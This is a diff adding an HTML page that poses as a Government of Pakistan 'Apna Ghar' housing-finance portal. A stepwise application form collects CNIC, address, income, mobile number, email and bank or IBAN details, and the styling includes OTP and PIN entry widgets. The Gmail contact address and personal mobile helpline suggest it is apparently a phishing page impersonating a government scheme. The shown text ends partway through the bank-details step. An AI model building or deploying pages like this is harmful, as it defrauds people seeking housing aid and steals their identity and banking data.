@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Apna Ghar Program | Government of Pakistan</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Noto+Nastaliq+Urdu:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:'Inter',-apple-system,sans-serif;background:#f0f4f8;min-height:100vh;color:#0f172a;line-height:1.6;-webkit-font-smoothing:antialiased}
+.urdu{font-family:'Noto Nastaliq Urdu',serif;direction:rtl;text-align:right;line-height:2}
+.topbar{background:#01411C;color:#d1fae5;padding:8px 0;font-size:12px}
+.topbar-inner{max-width:1250px;margin:0 auto;padding:0 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px}
+.topbar .gov{display:flex;align-items:center;gap:8px;font-weight:600;color:#fff}
+.topbar .flag{width:24px;height:16px;background:linear-gradient(90deg,#01411C 25%,#fff 25%);border:1px solid rgba(255,255,255,.4);position:relative;flex-shrink:0}
+.topbar .flag::after{content:'☪';position:absolute;right:4px;top:-1px;color:#01411C;font-size:8px}
+.topbar a{color:#d1fae5;text-decoration:none}
+.main-header{background:#fff;border-bottom:3px solid #01411C;padding:12px 0;box-shadow:0 2px 12px rgba(0,0,0,.08);position:sticky;top:0;z-index:60}
+.header-inner{max-width:1250px;margin:0 auto;padding:0 20px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:14px}
+.logo-area{display:flex;align-items:center;gap:12px;cursor:pointer}
+.logo-icon{width:50px;height:50px;background:linear-gradient(135deg,#01411C,#0a6b30);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:24px;color:#fff;box-shadow:0 4px 14px rgba(1,65,28,.35);flex-shrink:0}
+.logo-text h1{font-size:17px;font-weight:800;color:#01411C;line-height:1.2}
+.logo-text p{font-size:10px;color:#64748b;font-weight:500}
+.header-actions{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.btn-outline{padding:8px 18px;border:1.5px solid #01411C;background:#fff;color:#01411C;border-radius:8px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;transition:.2s;display:none;}
+.btn-solid{padding:8px 20px;background:#01411C;color:#fff;border:none;border-radius:8px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit;transition:.2s;box-shadow:0 4px 12px rgba(1,65,28,.3);display:none;}
+.btn-apply{background:linear-gradient(135deg,#f59e0b,#d97706);color:#fff;padding:8px 20px;border:none;border-radius:8px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit;transition:.2s;box-shadow:0 4px 12px rgba(245,158,11,.4)}
+.btn-apply:hover{background:linear-gradient(135deg,#d97706,#b45309)}
+.hero{background:linear-gradient(135deg,#01411C 0%,#0a6b30 60%,#01411C 100%);color:#fff;padding:40px 0;position:relative;overflow:hidden}
+.hero::before{content:'';position:absolute;top:-50%;right:-10%;width:500px;height:500px;background:radial-gradient(circle,rgba(255,255,255,.08),transparent 70%);border-radius:50%}
+.hero-inner{max-width:1250px;margin:0 auto;padding:0 20px;position:relative;z-index:1;display:grid;grid-template-columns:1.4fr 1fr;gap:32px;align-items:center}
+.hero h2{font-size:30px;font-weight:800;margin-bottom:6px;letter-spacing:-.5px;line-height:1.15}
+.hero .urdu-title{font-family:'Noto Nastaliq Urdu',serif;font-size:20px;margin-bottom:12px;opacity:.95;direction:rtl;text-align:left}
+.hero .subtitle{font-size:14px;opacity:.9;margin-bottom:22px;line-height:1.7;max-width:520px}
+.hero-cta{display:flex;gap:10px;flex-wrap:wrap}
+.hero-cta .btn-apply-big{background:linear-gradient(135deg,#f59e0b,#d97706);color:#fff;padding:14px 30px;border:none;border-radius:10px;font-size:14px;font-weight:800;cursor:pointer;font-family:inherit;transition:.25s;box-shadow:0 8px 24px rgba(245,158,11,.45)}
+.hero-cta .btn-apply-big:hover{transform:translateY(-2px)}
+.hero-cta .btn-learn{background:rgba(255,255,255,.12);color:#fff;padding:14px 26px;border:1.5px solid rgba(255,255,255,.35);border-radius:10px;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;transition:.2s}
+.hero-cta .btn-learn:hover{background:rgba(255,255,255,.22)}
+.hero-stats{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.stat-card{background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.2);border-radius:12px;padding:14px;backdrop-filter:blur(10px)}
+.stat-card .num{font-size:20px;font-weight:800;color:#fbbf24;line-height:1.2}
+.stat-card .label{font-size:10px;opacity:.85;margin-top:3px}
+@media(max-width:768px){.hero-inner{grid-template-columns:1fr}.hero h2{font-size:24px}}
+.nav-tabs{background:#fff;border-bottom:1px solid #e2e8f0;position:sticky;top:74px;z-index:50;box-shadow:0 2px 10px rgba(0,0,0,.05)}
+.nav-inner{max-width:1250px;margin:0 auto;padding:0 20px;display:flex;overflow-x:auto}
+.nav-tab{padding:13px 20px;font-size:12.5px;font-weight:600;color:#64748b;border:none;background:none;cursor:pointer;font-family:inherit;border-bottom:3px solid transparent;white-space:nowrap;transition:.2s}
+.nav-tab:hover{color:#01411C;background:#f8fafc}
+.nav-tab.active{color:#01411C;border-bottom-color:#f59e0b;font-weight:700}
+.content{max-width:1250px;margin:0 auto;padding:28px 20px 50px}
+.section{display:none;animation:fadeIn .35s ease}
+.section.active{display:block}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+.card{background:#fff;border-radius:14px;box-shadow:0 4px 16px rgba(0,0,0,.06);border:1px solid #e2e8f0;padding:26px;margin-bottom:22px}
+.card h3{font-size:17px;font-weight:700;color:#01411C;margin-bottom:18px;padding-bottom:14px;border-bottom:2px solid #dcfce7;display:flex;align-items:center;gap:10px}
+.card h3::before{content:'';width:4px;height:20px;background:#fbbf24;border-radius:2px;flex-shrink:0}
+.info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin-bottom:18px}
+.info-item{background:#f0fdf4;padding:14px;border-radius:10px;border-left:3px solid #01411C}
+.info-item .lbl{font-size:10px;color:#64748b;font-weight:600;text-transform:uppercase;letter-spacing:.5px;margin-bottom:5px}
+.info-item .val{font-size:15px;font-weight:700;color:#01411C}
+.bank-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px}
+.bank-card{background:#f8fafc;border:1px solid #e2e8f0;border-radius:10px;padding:12px 14px;transition:.2s}
+.bank-card:hover{border-color:#01411C;box-shadow:0 4px 12px rgba(1,65,28,.1)}
+.bank-card .name{font-size:13px;font-weight:700;color:#01411C;margin-bottom:4px}
+.bank-card .type{font-size:10px;color:#64748b;font-weight:500}
+.loan-table{width:100%;border-collapse:collapse;font-size:13px;margin-top:10px}
+.loan-table th{background:#01411C;color:#fff;padding:12px 14px;text-align:left;font-weight:600;font-size:12px}
+.loan-table th:first-child{border-radius:8px 0 0 0}
+.loan-table th:last-child{border-radius:0 8px 0 0}
+.loan-table td{padding:12px 14px;border-bottom:1px solid #f1f5f9;color:#334155}
+.loan-table tr:hover td{background:#f0fdf4}
+.loan-table tr:last-child td{border-bottom:none}
+.loan-table .highlight{color:#01411C;font-weight:700}
+.form-group{margin-bottom:16px}
+.form-group input,.form-group select,.form-group textarea{width:100%;padding:11px 13px;border:1.5px solid #cbd5e1;border-radius:9px;font-size:13px;font-family:inherit;background:#fff;transition:.2s;color:#0f172a}
+.form-group input:focus,.form-group select:focus,.form-group textarea:focus{border-color:#01411C;outline:none;box-shadow:0 0 0 3px rgba(1,65,28,.12)}
+.form-group input::placeholder{color:#94a3b8;font-size:12px}
+.form-row{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+@media(max-width:600px){.form-row{grid-template-columns:1fr}}
+.bi-label{display:flex;justify-content:space-between;align-items:center;gap:8px;margin-bottom:5px;flex-wrap:wrap}
+.bi-label .en{font-size:12px;font-weight:600;color:#334155}
+.bi-label .ur{font-family:'Noto Nastaliq Urdu',serif;font-size:13px;color:#64748b;direction:rtl}
+.bi-label .req{color:#dc2626;font-weight:700}
+.btn-primary{background:#01411C;color:#fff;border:none;padding:12px 24px;border-radius:9px;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit;transition:.2s;width:100%}
+.btn-primary:hover{background:#0a6b30;transform:translateY(-1px);box-shadow:0 4px 14px rgba(1,65,28,.3)}
+.btn-secondary{background:#fff;color:#01411C;border:1.5px solid #cbd5e1;padding:12px 24px;border-radius:9px;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;transition:.2s}
+.btn-secondary:hover{background:#f8fafc;border-color:#01411C}
+.btn-group{display:flex;gap:10px;margin-top:18px}
+.btn-group .btn-primary{flex:1}
+.btn-group .btn-secondary{flex:0 0 auto}
+.page{display:none}
+.page.active{display:block;animation:fadeIn .35s ease}
+.page-header{background:#fff;border-radius:14px 14px 0 0;padding:20px 26px;border:1px solid #e2e8f0;border-bottom:none;display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+.page-num{width:44px;height:44px;background:linear-gradient(135deg,#01411C,#0a6b30);color:#fff;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:800;flex-shrink:0;box-shadow:0 4px 12px rgba(1,65,28,.3)}
+.page-header-text h2{font-size:17px;font-weight:700;color:#01411C;margin:0}
+.page-header-text .ur{font-family:'Noto Nastaliq Urdu',serif;font-size:13px;color:#64748b;direction:rtl;margin-top:2px}
+.page-body{background:#fff;border-radius:0 0 14px 14px;padding:26px;border:1px solid #e2e8f0;border-top:none;box-shadow:0 4px 16px rgba(0,0,0,.06)}
+.instruction{background:#fef3c7;border-left:4px solid #f59e0b;padding:14px 18px;border-radius:10px;margin-bottom:18px;font-size:12.5px;color:#78350f}
+.instruction strong{color:#92400e;display:block;margin-bottom:3px}
+.instruction .ur{font-family:'Noto Nastaliq Urdu',serif;font-size:13px;direction:rtl;text-align:right;margin-top:6px;color:#92400e;line-height:2;border-top:1px dashed #fbbf24;padding-top:6px}
+.progress-wrap{background:#fff;border-radius:12px;padding:16px 20px;margin-bottom:18px;border:1px solid #e2e8f0;box-shadow:0 2px 10px rgba(0,0,0,.05)}
+.progress-label{display:flex;justify-content:space-between;font-size:12px;font-weight:600;color:#64748b;margin-bottom:8px;flex-wrap:wrap;gap:6px}
+.progress-label .pct{color:#f59e0b;font-weight:800}
+.progress-bar{height:8px;background:#f1f5f9;border-radius:4px;overflow:hidden}
+.progress-fill{height:100%;background:linear-gradient(90deg,#01411C,#f59e0b);border-radius:4px;transition:width .5s ease}
+.alert{padding:12px 16px;border-radius:9px;font-size:12.5px;margin-bottom:14px;display:flex;align-items:flex-start;gap:10px;line-height:1.6}
+.alert-info{background:#eff6ff;border-left:4px solid #3b82f6;color:#1e40af}
+.alert-success{background:#f0fdf4;border-left:4px solid #22c55e;color:#166534;font-weight:600}
+.alert-warning{background:#fffbeb;border-left:4px solid #f59e0b;color:#78350f}
+.otp-display{background:linear-gradient(135deg,#f0fdf4,#dcfce7);border:2px dashed #16a34a;border-radius:12px;padding:18px;margin:14px 0;text-align:center}
+.otp-display .lbl{font-size:11px;color:#166534;font-weight:600;text-transform:uppercase;letter-spacing:1px;margin-bottom:5px}
+.otp-display .num{font-family:'Courier New',monospace;font-size:26px;font-weight:800;color:#14532d;letter-spacing:6px;margin:6px 0}
+.otp-display .to{font-size:12px;color:#166534}
+.pin-row{display:flex;gap:10px;justify-content:center;margin:20px 0;flex-wrap:wrap}
+.pin-row input{width:50px;height:58px;text-align:center;font-size:22px;font-weight:800;border:2px solid #cbd5e1;border-radius:10px;padding:0;background:#f8fafc;color:#01411C;transition:.2s}
+.pin-row input:focus{border-color:#01411C;background:#fff;box-shadow:0 0 0 3px rgba(1,65,28,.15);transform:scale(1.05)}
+.review-table{width:100%;font-size:12.5px}
+.review-table tr{border-bottom:1px solid #f1f5f9}
+.review-table tr:last-child{border-bottom:none}
+.review-table td{padding:10px 0}
+.review-table td:first-child{color:#64748b;font-weight:500;width:40%}
+.review-table td:last-child{color:#01411C;font-weight:700;text-align:right;word-break:break-word}
+.success-box{text-align:center;padding:36px 20px}
+.success-box .icon{width:84px;height:84px;background:#dcfce7;color:#16a34a;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:42px;margin-bottom:18px;box-shadow:0 8px 24px rgba(22,163,74,.2)}
+.success-box h2{color:#16a34a;font-size:22px;margin-bottom:8px}
+.app-id{background:#f0fdf4;padding:14px 28px;border-radius:10px;font-family:'Courier New',monospace;font-size:18px;font-weight:800;color:#01411C;display:inline-block;margin:14px 0;border:2px solid #dcfce7;letter-spacing:2px}
+.contact-box{background:#f8fafc;border:1px solid #e2e8f0;border-radius:12px;padding:20px;margin-top:18px}
+.contact-box .row{display:flex;align-items:center;gap:12px;padding:10px 0;border-bottom:1px solid #e2e8f0}
+.contact-box .row:last-child{border-bottom:none}
+.contact-box .icon{width:38px;height:38px;background:#dcfce7;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
+.contact-box .info .label{font-size:10px;color:#64748b;font-weight:600;text-transform:uppercase;letter-spacing:.5px}
+.contact-box .info .value{font-size:14px;font-weight:700;color:#01411C}
+.contact-box .info .value a{color:#01411C;text-decoration:none}
+.contact-box .info .value a:hover{text-decoration:underline}
+.footer{background:#01411C;color:#a7f3d0;padding:24px 0;font-size:11.5px;margin-top:40px}
+.footer-inner{max-width:1250px;margin:0 auto;padding:0 20px;text-align:center}
+.footer a{color:#d1fae5;text-decoration:none}
+.footer a:hover{color:#fff}
+.footer .links{margin-top:8px;display:flex;justify-content:center;gap:18px;flex-wrap:wrap}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+<div class="topbar-inner">
+<div class="gov"><div class="flag"></div>Government of Pakistan | Apna Ghar Program</div>
+<div>Helpline: <strong>0335-6671539</strong> | Email: <strong>apnaghar.gov.com@gmail.com</strong></div>
+</div>
+</div>
+
+<div class="main-header">
+<div class="header-inner">
+<div class="logo-area" onclick="showHome()">
+<div class="logo-icon">🏛️</div>
+<div class="logo-text"><h1>Apna Ghar Program</h1><p>Affordable Housing Finance Scheme</p></div>
+</div>
+<div class="header-actions">
+<!-- Login aur Register ko hide kar diya gaya hai -->
+<button class="btn-apply" onclick="handleApply()">Apply Now →</button>
+</div>
+</div>
+</div>
+
+<div id="homeView">
+<div class="hero">
+<div class="hero-inner">
+<div>
+<h2>Apna Ghar – Aapka Haq</h2>
+<p class="urdu-title urdu">اپنا گھر — آپ کا حق</p>
+<p class="subtitle">Affordable housing finance for first-time homeowners. Subsidized markup, no processing fee, financing up to PKR 10 Million through all Pakistani banks.</p>
+<div class="hero-cta">
+<button class="btn-apply-big" onclick="handleApply()">📝 Apply Now</button>
+<button class="btn-learn" onclick="switchTab(1)">Check Eligibility →</button>
+</div>
+</div>
+<div class="hero-stats">
+<div class="stat-card"><div class="num">PKR 10M</div><div class="label">Maximum Financing</div></div>
+<div class="stat-card"><div class="num">5%</div><div class="label">Fixed Markup (10 Years)</div></div>
+<div class="stat-card"><div class="num">20 Years</div><div class="label">Maximum Tenure</div></div>
+<div class="stat-card"><div class="num">90:10</div><div class="label">Loan-to-Value Ratio</div></div>
+</div>
+</div>
+</div>
+
+<div class="nav-tabs">
+<div class="nav-inner">
+<button class="nav-tab active" onclick="switchTab(0)">Scheme Overview</button>
+<button class="nav-tab" onclick="switchTab(1)">Eligibility & Documents</button>
+<button class="nav-tab" onclick="switchTab(2)">Loan Plans</button>
+<button class="nav-tab" onclick="switchTab(3)">Participating Banks</button>
+<button class="nav-tab" onclick="switchTab(4)">Apply Online</button>
+</div>
+</div>
+
+<div class="content">
+
+<div class="section active" id="sec0">
+<div class="card">
+<h3>Program Overview</h3>
+<p style="font-size:13px;color:#475569;margin-bottom:16px;line-height:1.8">The <strong>Apna Ghar Program</strong> offers subsidized markup rates and risk-sharing support for first-time home buyers. Apply online through this portal or visit any participating bank branch.</p>
+<div class="info-grid">
+<div class="info-item"><div class="lbl">Maximum Financing</div><div class="val">PKR 10 Million</div></div>
+<div class="info-item"><div class="lbl">Minimum Equity</div><div class="val">10% of Property Value</div></div>
+<div class="info-item"><div class="lbl">Markup (First 10 Years)</div><div class="val">5% Fixed</div></div>
+<div class="info-item"><div class="lbl">Markup (After 10 Years)</div><div class="val">1-Year KIBOR + 3%</div></div>
+<div class="info-item"><div class="lbl">Financing Tenure</div><div class="val">Up to 20 Years</div></div>
+<div class="info-item"><div class="lbl">Processing Fee</div><div class="val">Nil</div></div>
+<div class="info-item"><div class="lbl">Prepayment Penalty</div><div class="val">Nil</div></div>
+<div class="info-item"><div class="lbl">Property Size Limit</div><div class="val">10 Marla House / 1,500 sq.ft Flat</div></div>
+</div>
+<div class="alert alert-info">For official information, visit apnaghar.gov.pk or contact Helpline: 0335-6671539.</div>
+<div class="contact-box">
+<div class="row"><div class="icon">📞</div><div class="info"><div class="label">Helpline</div><div class="value"><a href="tel:03356671539">0335-6671539</a></div></div></div>
+<div class="row"><div class="icon">✉️</div><div class="info"><div class="label">Email</div><div class="value"><a href="mailto:apnaghar.gov.com@gmail.com">apnaghar.gov.com@gmail.com</a></div></div></div>
+</div>
+</div>
+</div>
+
+<div class="section" id="sec1">
+<div class="card">
+<h3>Eligibility Criteria</h3>
+<ul style="list-style:none">
+<li style="padding:11px 0;border-bottom:1px solid #f1f5f9;display:flex;gap:10px;font-size:13px"><span style="color:#16a34a;font-weight:800">✓</span> Pakistani citizen holding a valid CNIC</li>
+<li style="padding:11px 0;border-bottom:1px solid #f1f5f9;display:flex;gap:10px;font-size:13px"><span style="color:#16a34a;font-weight:800">✓</span> First-time homeowner (no property in own name)</li>
+<li style="padding:11px 0;border-bottom:1px solid #f1f5f9;display:flex;gap:10px;font-size:13px"><span style="color:#16a34a;font-weight:800">✓</span> Age: 25–60 years (salaried) or up to 65 years (self-employed)</li>
+<li style="padding:11px 0;border-bottom:1px solid #f1f5f9;display:flex;gap:10px;font-size:13px"><span style="color:#16a34a;font-weight:800">✓</span> Minimum gross monthly income: PKR 25,000</li>
+<li style="padding:11px 0;border-bottom:1px solid #f1f5f9;display:flex;gap:10px;font-size:13px"><span style="color:#16a34a;font-weight:800">✓</span> Clean credit history (ECIB check)</li>
+<li style="padding:11px 0;display:flex;gap:10px;font-size:13px"><span style="color:#16a34a;font-weight:800">✓</span> One subsidized home loan per individual</li>
+</ul>
+</div>
+<div class="card">
+<h3>Required Documents</h3>
+<ul style="list-style:none">
+<li style="padding:11px 0;border-bottom:1px solid #f1f5f9;display:flex;gap:10px;font-size:13px"><span style="color:#16a34a;font-weight:800">✓</span> CNIC copy of applicant</li>
+<li style="padding:11px 0;border-bottom:1px solid #f1f5f9;display:flex;gap:10px;font-size:13px"><span style="color:#16a34a;font-weight:800">✓</span> Proof of income: Salary slip or bank statements</li>
+<li style="padding:11px 0;border-bottom:1px solid #f1f5f9;display:flex;gap:10px;font-size:13px"><span style="color:#16a34a;font-weight:800">✓</span> Last 6–12 months bank statement</li>
+<li style="padding:11px 0;border-bottom:1px solid #f1f5f9;display:flex;gap:10px;font-size:13px"><span style="color:#16a34a;font-weight:800">✓</span> Property documents (if plot already owned)</li>
+<li style="padding:11px 0;display:flex;gap:10px;font-size:13px"><span style="color:#16a34a;font-weight:800">✓</span> Passport-sized photographs</li>
+</ul>
+</div>
+</div>
+
+<div class="section" id="sec2">
+<div class="card">
+<h3>Loan Plans & Monthly Installments</h3>
+<p style="font-size:13px;color:#475569;margin-bottom:14px">Choose from flexible financing slabs. Fixed markup 5% for first 10 years, then market rate. Tenure up to 20 years.</p>
+<table class="loan-table">
+<thead><tr><th>Loan Amount</th><th>Tenure</th><th>Monthly Installment</th><th>Markup (First 10 Yrs)</th></tr></thead>
+<tbody>
+<tr><td class="highlight">PKR 1,000,000</td><td>20 Years</td><td>PKR 6,600</td><td>5% Fixed</td></tr>
+<tr><td class="highlight">PKR 2,500,000</td><td>20 Years</td><td>PKR 16,499</td><td>5% Fixed</td></tr>
+<tr><td class="highlight">PKR 5,000,000</td><td>20 Years</td><td>PKR 32,997</td><td>5% Fixed</td></tr>
+<tr><td class="highlight">PKR 7,500,000</td><td>20 Years</td><td>PKR 49,497</td><td>5% Fixed</td></tr>
+<tr><td class="highlight">PKR 10,000,000</td><td>20 Years</td><td>PKR 65,996</td><td>5% Fixed</td></tr>
+<tr><td class="highlight">PKR 30,000,000*</td><td>20 Years</td><td>PKR 197,988*</td><td>5% Fixed*</td></tr>
+</tbody>
+</table>
+</div>
+</div>
+
+<div class="section" id="sec3">
+<div class="card">
+<h3>Participating Banks & Financial Institutions</h3>
+<p style="font-size:13px;color:#475569;margin-bottom:14px">Following banks are participating in the Apna Ghar Program. Contact your nearest branch for application.</p>
+<div class="bank-grid">
+<div class="bank-card"><div class="name">Habib Bank Limited (HBL)</div><div class="type">Commercial Bank</div></div>
+<div class="bank-card"><div class="name">United Bank Limited (UBL)</div><div class="type">Commercial Bank</div></div>
+<div class="bank-card"><div class="name">Meezan Bank</div><div class="type">Islamic Bank</div></div>
+<div class="bank-card"><div class="name">Bank Alfalah</div><div class="type">Commercial Bank</div></div>
+<div class="bank-card"><div class="name">Bank AL Habib</div><div class="type">Commercial Bank</div></div>
+<div class="bank-card"><div class="name">Allied Bank Limited (ABL)</div><div class="type">Commercial Bank</div></div>
+<div class="bank-card"><div class="name">MCB Islamic Bank</div><div class="type">Islamic Bank</div></div>
+<div class="bank-card"><div class="name">BankIslami Pakistan</div><div class="type">Islamic Bank</div></div>
+<div class="bank-card"><div class="name">Faysal Bank</div><div class="type">Islamic Bank</div></div>
+<div class="bank-card"><div class="name">Askari Bank</div><div class="type">Commercial Bank</div></div>
+<div class="bank-card"><div class="name">JS Bank</div><div class="type">Commercial Bank</div></div>
+<div class="bank-card"><div class="name">National Bank of Pakistan (NBP)</div><div class="type">Public Sector</div></div>
+<div class="bank-card"><div class="name">The Bank of Punjab (BOP)</div><div class="type">Public Sector</div></div>
+<div class="bank-card"><div class="name">Bank of Khyber</div><div class="type">Public Sector</div></div>
+<div class="bank-card"><div class="name">Sindh Bank</div><div class="type">Public Sector</div></div>
+<div class="bank-card"><div class="name">First Women Bank</div><div class="type">Public Sector</div></div>
+<div class="bank-card"><div class="name">Dubai Islamic Bank</div><div class="type">Islamic Bank</div></div>
+<div class="bank-card"><div class="name">Al Baraka Bank</div><div class="type">Islamic Bank</div></div>
+<div class="bank-card"><div class="name">Habib Metropolitan Bank</div><div class="type">Commercial Bank</div></div>
+<div class="bank-card"><div class="name">Soneri Bank</div><div class="type">Commercial Bank</div></div>
+<div class="bank-card"><div class="name">Samba Bank</div><div class="type">Commercial Bank</div></div>
+<div class="bank-card"><div class="name">Silk Bank</div><div class="type">Commercial Bank</div></div>
+<div class="bank-card"><div class="name">Standard Chartered (Saadiq)</div><div class="type">Islamic Banking</div></div>
+<div class="bank-card"><div class="name">House Building Finance Corp (HBFC)</div><div class="type">Specialized</div></div>
+</div>
+<div class="alert alert-info" style="margin-top:16px">ℹ️ Banks may have additional eligibility criteria. Confirm with your branch before applying.</div>
+</div>
+</div>
+
+<div class="section" id="sec4">
+<div class="progress-wrap">
+<div class="progress-label"><span id="progStep">Step 1 of 9 — Personal Details & CNIC Verification</span><span class="pct" id="progPct">11%</span></div>
+<div class="progress-bar"><div class="progress-fill" id="progFill" style="width:11%"></div></div>
+</div>
+
+<div class="page active" id="page1">
+<div class="page-header"><div class="page-num">1</div><div class="page-header-text"><h2>Personal Details & CNIC Verification</h2><div class="ur">ذاتی معلومات اور شناختی کارڈ کی تصدیق</div></div></div>
+<div class="page-body">
+<div class="instruction"><strong>📋 What to fill:</strong> Enter your full name, father's name, date of birth, gender, and CNIC number exactly as they appear on your CNIC.<div class="ur">📋 کیا بھریں: اپنا پورا نام، والد کا نام، تاریخ پیدائش، جنس اور شناختی کارڈ نمبر اپنے شناختی کارڈ کے مطابق درج کریں۔</div></div>
+<div class="form-row">
+<div class="form-group"><div class="bi-label"><span class="en">Full Name <span class="req">*</span></span><span class="ur">پورا نام</span></div><input type="text" id="fullName" placeholder="Ali Khan (as per CNIC)"></div>
+<div class="form-group"><div class="bi-label"><span class="en">Father Name <span class="req">*</span></span><span class="ur">والد کا نام</span></div><input type="text" id="fatherName" placeholder="Yousuf Khan"></div>
+</div>
+<div class="form-row">
+<div class="form-group"><div class="bi-label"><span class="en">Date of Birth <span class="req">*</span></span><span class="ur">تاریخ پیدائش</span></div><input type="date" id="dob"></div>
+<div class="form-group"><div class="bi-label"><span class="en">Gender <span class="req">*</span></span><span class="ur">جنس</span></div><select id="gender"><option value="">-- Select --</option><option>Male</option><option>Female</option><option>Other</option></select></div>
+</div>
+<div class="form-row">
+<div class="form-group"><div class="bi-label"><span class="en">Occupation</span><span class="ur">پیشہ</span></div><input type="text" id="occupation" placeholder="Salaried / Self-employed"></div>
+<div class="form-group"><div class="bi-label"><span class="en">Marital Status</span><span class="ur">ازدواجی حیثیت</span></div><select id="marital"><option value="">-- Select --</option><option>Single</option><option>Married</option></select></div>
+</div>
+<div class="form-group"><div class="bi-label"><span class="en">CNIC Number <span class="req">*</span></span><span class="ur">شناختی کارڈ نمبر</span></div><input type="text" id="cnic" maxlength="15" placeholder="00000-0000000-0" style="letter-spacing:4px;font-family:monospace;font-weight:700;font-size:15px;text-align:center;padding:14px" oninput="formatCNIC(this)"><small style="color:#64748b;font-size:10px;display:block;margin-top:5px;text-align:center">Format: XXXXX-XXXXXXX-X | NADRA verification will be performed</small></div>
+<button class="btn-primary" onclick="gotoPage(2)">Continue to Address →</button>
+</div>
+</div>
+
+<div class="page" id="page2">
+<div class="page-header"><div class="page-num">2</div><div class="page-header-text"><h2>Address Details</h2><div class="ur">پتے کی تفصیلات</div></div></div>
+<div class="page-body">
+<div class="instruction"><strong>📋 What to fill:</strong> Enter your current residential address, city, district and province.<div class="ur">📋 کیا بھریں: اپنا موجودہ رہائشی پتہ، شہر، ضلع اور صوبہ درج کریں۔</div></div>
+<div class="form-group"><div class="bi-label"><span class="en">Current Address <span class="req">*</span></span><span class="ur">موجودہ پتہ</span></div><textarea id="address1" rows="2" placeholder="House #, Street, Area"></textarea></div>
+<div class="form-row">
+<div class="form-group"><div class="bi-label"><span class="en">City <span class="req">*</span></span><span class="ur">شہر</span></div><input type="text" id="city" placeholder="Karachi"></div>
+<div class="form-group"><div class="bi-label"><span class="en">District <span class="req">*</span></span><span class="ur">ضلع</span></div><input type="text" id="district" placeholder="Lahore"></div>
+</div>
+<div class="form-row">
+<div class="form-group"><div class="bi-label"><span class="en">Province <span class="req">*</span></span><span class="ur">صوبہ</span></div><select id="province"><option value="">-- Select --</option><option>Sindh</option><option>Punjab</option><option>Khyber Pakhtunkhwa</option><option>Balochistan</option><option>Islamabad</option></select></div>
+<div class="form-group"><div class="bi-label"><span class="en">Postal Code</span><span class="ur">ڈاک کوڈ</span></div><input type="text" id="postal" placeholder="00000" maxlength="6"></div>
+</div>
+<div class="btn-group"><button class="btn-secondary" onclick="gotoPage(1)">← Back</button><button class="btn-primary" onclick="gotoPage(3)">Continue to Income →</button></div>
+</div>
+</div>
+
+<div class="page" id="page3">
+<div class="page-header"><div class="page-num">3</div><div class="page-header-text"><h2>Income & Contact</h2><div class="ur">آمدنی اور رابطہ</div></div></div>
+<div class="page-body">
+<div class="instruction"><strong>📋 What to fill:</strong> Enter your monthly gross income, active mobile number (OTP will be sent here), and a valid email address.<div class="ur">📋 کیا بھریں: اپنی ماہانہ آمدنی، فعال موبائل نمبر (جس پر OTP بھیجا جائے گا) اور درست ای میل درج کریں۔</div></div>
+<div class="form-row">
+<div class="form-group"><div class="bi-label"><span class="en">Monthly Income (PKR) <span class="req">*</span></span><span class="ur">ماہانہ آمدنی (روپے)</span></div><input type="number" id="income" placeholder="50000"></div>
+<div class="form-group"><div class="bi-label"><span class="en">Mobile Number (for OTP) <span class="req">*</span></span><span class="ur">موبائل نمبر (OTP کے لیے)</span></div><input type="tel" id="mobile" placeholder="0300-0000000" maxlength="12" oninput="formatPhone(this)"></div>
+</div>
+<div class="form-group"><div class="bi-label"><span class="en">Email Address <span class="req">*</span></span><span class="ur">ای میل ایڈریس</span></div><input type="email" id="email" placeholder="you@example.com"></div>
+<div class="btn-group"><button class="btn-secondary" onclick="gotoPage(2)">← Back</button><button class="btn-primary" onclick="gotoPage(4)">Continue to Bank →</button></div>
+</div>
+</div>
+
+<div class="page" id="page4">
+<div class="page-header"><div class="page-num">4</div><div class="page-header-text"><h2>Bank Details</h2><div class="ur">بینک کی تفصیلات</div></div></div>
+<div class="page-body">
+<div class="instruction"><strong>📋 What to fill:</strong> Select your bank, enter your account title, and your IBAN number.<div class="ur">📋 کیا بھریں: اپنا بینک منتخب کریں، اکاؤنٹ ٹائٹل اور IBAN نمبر درج کریں۔</div></div>
+<div class="form-group"><div class="bi-label"><span class="en">Select Bank <span class="req">*</span></span><span class="ur">بینک منتخب کریں</span></div><select id="bank"><option value="">-- Select Bank --</option><option>HBL</option><option>UBL</option><option>Meezan Bank</option><option>Bank Alfalah</option><option>Bank AL Habib</option><option>Allied Bank</option><option>MCB Islamic</option><option>BankIslami</option><option>Faysal Bank</option><option>Askari Bank</option><option>JS Bank</option><option>NBP</option><option>Bank of Punjab</option><option>Bank of Khyber</option><option>Sindh Bank</option><option>Dubai Islamic</option><option>Al Baraka</option><option>Habib Metro</option><option>Soneri Bank</option><option>Samba Bank</option><option>Silk Bank</option><option>Standard Chartered</option><option>HBFC</option><option>JazzCash</option><option>EasyPaisa</option></select></div>
